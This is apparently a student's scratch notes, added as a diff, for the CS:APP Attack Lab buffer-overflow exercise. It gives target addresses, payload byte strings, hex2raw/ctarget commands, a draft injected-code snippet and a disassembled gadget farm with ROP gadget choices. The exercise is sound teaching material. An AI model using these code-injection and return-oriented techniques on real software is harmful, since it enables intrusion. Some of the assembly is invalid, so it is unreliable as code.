@@ -1,0 +1,147 @@
+https://blog.csdn.net/qq_37500516/article/details/113989299
+https://blog.csdn.net/weixin_52259822/article/details/130201541
+https://blog.csdn.net/qq_53336526/article/details/128236163
+https://www.viseator.com/2017/07/18/CS_APP_AttackLab/#%E7%AE%80%E4%BB%8B
+https://earthaa.github.io/2020/02/11/CSAPP-Attacklab/#more
+
+cd csapplab/attacklab/target1
+
+touch1 address: 0x4017c0
+
+c0 17 40
+
+cat touch1.txt | ./hex2raw | ./ctarget -q
+
+touch2 address: 0x4017ec
+
+movq $0x4017ec,%rip
+movq 0x59b997fa,%rdi
+retq
+
+cat touch2.txt | ./hex2raw | ./ctarget -q
+
+cat touch3.txt | ./hex2raw | ./ctarget -q
+
+cat level5.txt | ./hex2raw | ./rtarget -q
+0x5561dc78
+0x5561dca0
+
+0x59b997fa
+
+35 39 62 39 39 37 66 61
+
+run < touch1.txt -q
+
+
+
+
+address1
+----------
+0x59b997fa
+----------
+address2
+
+address2: pop rax; ret
+address1: mov rax, rdi
+
+  b4:	b8 29 58 90 c3       	mov    $0xc3905829,%eax //b7
+  48 89 c7 mov rax, rdi  //a6
+0000000000000000 <start_farm>:
+   0:	f3 0f 1e fa          	endbr64 
+   4:	55                   	push   %rbp
+   5:	48 89 e5             	mov    %rsp,%rbp
+   8:	b8 01 00 00 00       	mov    $0x1,%eax
+   d:	5d                   	pop    %rbp
+   e:	c3                   	retq   
+
+000000000000000f <getval_142>:
+   f:	f3 0f 1e fa          	endbr64 
+  13:	55                   	push   %rbp
+  14:	48 89 e5             	mov    %rsp,%rbp
+  17:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
+  1c:	5d                   	pop    %rbp
+  1d:	c3                   	retq   
+
+000000000000001e <addval_273>:
+  1e:	f3 0f 1e fa          	endbr64 
+  22:	55                   	push   %rbp
+  23:	48 89 e5             	mov    %rsp,%rbp
+  26:	89 7d fc             	mov    %edi,-0x4(%rbp)
+  29:	8b 45 fc             	mov    -0x4(%rbp),%eax
+  2c:	2d b8 76 38 3c       	sub    $0x3c3876b8,%eax
+  31:	5d                   	pop    %rbp
+  32:	c3                   	retq   
+
+0000000000000033 <addval_219>:
+  33:	f3 0f 1e fa          	endbr64 
+  37:	55                   	push   %rbp
+  38:	48 89 e5             	mov    %rsp,%rbp
+  3b:	89 7d fc             	mov    %edi,-0x4(%rbp)
+  3e:	8b 45 fc             	mov    -0x4(%rbp),%eax
+  41:	2d af 8c a7 6f       	sub    $0x6fa78caf,%eax
+  46:	5d                   	pop    %rbp
+  47:	c3                   	retq   
+
+0000000000000048 <setval_237>:
+  48:	f3 0f 1e fa          	endbr64 
+  4c:	55                   	push   %rbp
+  4d:	48 89 e5             	mov    %rsp,%rbp
+  50:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
+  54:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+  58:	c7 00 48 89 c7 c7    	movl   $0xc7c78948,(%rax)
+  5e:	90                   	nop
+  5f:	5d                   	pop    %rbp
+  60:	c3                   	retq   
+
+0000000000000061 <setval_424>:
+  61:	f3 0f 1e fa          	endbr64 
+  65:	55                   	push   %rbp
+  66:	48 89 e5             	mov    %rsp,%rbp
+  69:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
+  6d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+  71:	c7 00 54 c2 58 92    	movl   $0x9258c254,(%rax)
+  77:	90                   	nop
+  78:	5d                   	pop    %rbp
+  79:	c3                   	retq   
+
+000000000000007a <setval_470>:
+  7a:	f3 0f 1e fa          	endbr64 
+  7e:	55                   	push   %rbp
+  7f:	48 89 e5             	mov    %rsp,%rbp
+  82:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
+  86:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+  8a:	c7 00 63 48 8d c7    	movl   $0xc78d4863,(%rax)
+  90:	90                   	nop
+  91:	5d                   	pop    %rbp
+  92:	c3                   	retq   
+
+0000000000000093 <setval_426>:
+  93:	f3 0f 1e fa          	endbr64 
+  97:	55                   	push   %rbp
+  98:	48 89 e5             	mov    %rsp,%rbp
+  9b:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
+  9f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+  a3:	c7 00 48 89 c7 90    	movl   $0x90c78948,(%rax)
+  a9:	90                   	nop
+  aa:	5d                   	pop    %rbp
+  ab:	c3                   	retq   
+
+00000000000000ac <getval_280>:
+  ac:	f3 0f 1e fa          	endbr64 
+  b0:	55                   	push   %rbp
+  b1:	48 89 e5             	mov    %rsp,%rbp
+  b4:	b8 29 58 90 c3       	mov    $0xc3905829,%eax 
+  b9:	5d                   	pop    %rbp
+  ba:	c3                   	retq   
+
+00000000000000bb <mid_farm>:
+  bb:	f3 0f 1e fa          	endbr64 
+  bf:	55                   	push   %rbp
+  c0:	48 89 e5             	mov    %rsp,%rbp
+  c3:	b8 01 00 00 00       	mov    $0x1,%eax
+  c8:	5d                   	pop    %rbp
+  c9:	c3                   	retq 
+
+
+b *0x401971
+Touch1!: You called touch1()
